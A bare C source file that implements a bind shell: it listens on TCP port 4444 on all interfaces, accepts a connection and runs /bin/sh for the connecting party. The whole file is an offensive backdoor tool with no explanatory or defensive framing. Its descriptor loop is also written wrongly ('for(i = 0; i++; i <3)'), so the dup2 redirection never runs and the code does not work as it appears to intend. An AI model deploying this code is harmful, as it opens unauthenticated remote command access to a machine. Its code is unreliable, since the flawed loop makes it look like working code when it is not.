#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>

int main()
{
	int my_socket = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in my_sockaddr;
	my_sockaddr.sin_family = AF_INET;
    	my_sockaddr.sin_addr.s_addr = INADDR_ANY;
    	my_sockaddr.sin_port = htons(4444);
	bind(my_socket, (struct sockaddr *)&my_sockaddr, sizeof(my_sockaddr));

	listen(my_socket, 0);

	int my_accept = accept(my_socket, NULL, NULL);

	int i;
	for(i = 0; i++; i <3)
		dup2(my_accept, i);

	execve("/bin/sh", NULL, NULL);

	return 0;
}
